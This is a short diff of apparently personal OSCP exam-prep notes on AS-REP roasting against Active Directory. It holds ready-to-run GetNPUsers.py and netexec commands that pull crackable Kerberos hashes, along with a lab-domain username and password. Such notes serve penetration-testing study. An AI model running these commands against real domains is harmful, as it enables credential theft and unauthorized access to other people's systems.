@@ -1,5 +1,5 @@
 1. If you can find valid users through enum, sid-bruting, or rid-bruting try as-rep roasting.
 
-2. use this command == GetNPUsers.py oscp.exam/eric.wallows/EricLikesRunning800 -format hashcat -outputfile hashes.aspreroast -dc-ip dc01
+2. use this command == GetNPUsers.py oscp.exam/eric.wallows/EricLikesRunning800 -usersfile users -format hashcat -outputfile hashes.aspreroast -dc-ip dc01 -- TRY WITH AND WITHOUT USERS
 
 netexec kerberos <target_ip> -u users.txt --asreproast
